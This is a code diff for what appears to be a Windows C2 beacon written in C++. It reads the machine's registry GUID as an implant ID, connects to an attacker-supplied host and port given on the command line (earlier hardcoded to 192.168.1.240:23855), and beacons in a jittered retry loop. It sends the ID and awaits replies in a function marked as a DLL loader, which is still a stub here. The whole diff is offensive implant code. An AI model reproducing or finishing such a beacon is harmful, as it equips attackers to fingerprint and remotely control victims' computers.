@@ -1,5 +1,6 @@
 #include <iostream>
 #include <string>
+#include <sstream>
 
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 // Windows API
@@ -11,50 +12,45 @@
 #pragma  comment(lib,"ws2_32.lib")
 
 void die(const char* message);
-void reply(int s);
+void reply(SOCKET s);
 int rand_int(int max);
 
 int main(int argc, char* argv[])
 {
-    WSADATA wsa;
-    SOCKET s;
-    int retry_count;
-    const char* host = "192.168.1.240";
-    int port = 23855;
-    //char* host = argv[1];
-    //int port = strtol(argv[2], NULL, 10);
-    char uuid[36] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-
     char MachineGUID[37];
     DWORD BufferSize = sizeof(MachineGUID);
     ULONG nError;
+    std::string guid = u8"";
 
-    struct sockaddr_in server;
-    
    
-    
+    //UUID
     LONG res = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, MachineGUID, &BufferSize);
 
     if (res == 0)
     {
-        std::string guid = "";
         for (int i = 0; i < sizeof(MachineGUID); i++) {
-            if (MachineGUID[i] != '-') {
+            if (MachineGUID[i] != '-' && MachineGUID[i] != '\0') {
                 guid = guid + MachineGUID[i];
             }
         }
+        guid.insert(0, u8"♡");
         std::cout << guid << std::endl;
+        std::cout << sizeof(guid) << std::endl;
+
     }
     else {
         std::cerr << res;
     }
+    
+    //BEACON LOOP 
+    WSADATA wsa;
+    SOCKET s;
+    int retry_count;
+    char* host = argv[1];
+    int port = strtol(argv[2], NULL, 10);
 
-    memmove(uuid+3, uuid, 33);
-    uuid[0] = 0xe2;
-    uuid[1] = 0x99;
-    uuid[2] = 0xa5;
-    
-    
+    struct sockaddr_in server;
+
     std::cout << "\nInitialising Winsock...";
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
     {
@@ -88,17 +84,17 @@ int main(int argc, char* argv[])
             sleep((5 * retry_count) * jitter);
             continue;
         }
-        std::cout << "sending with uuid: " << uuid << std::endl;
+        std::cout << "sending with uuid: " << guid << std::endl;
         std::cout << "connected to server\n";
 
-        if (send(s, uuid, strlen(uuid), 0) < 0)
+        if (send(s, guid.c_str(), guid.length(), 0) < 0)
         {
             std::cout << "error while sending transmission\n";
             retry_count += 1;
             sleep((5 * retry_count) * jitter);
             continue;
         }
-        //reply(s);
+        reply((SOCKET)s);
         retry_count = 0;
         sleep(6 * jitter);
     }
@@ -111,7 +107,7 @@ void die(const char* message) {
     exit(EXIT_FAILURE);
 }
 
-void reply(int s) {
+void reply(SOCKET s) {
     char buffer[512];
     int n;
     int size_recv, size_total = 0;
@@ -126,7 +122,7 @@ void reply(int s) {
         else if (size_recv > 0) {
             //DLL Loader
             std::cout << ("Loading DLL...");
-
+            break;
         }
         else
             closesocket(s);
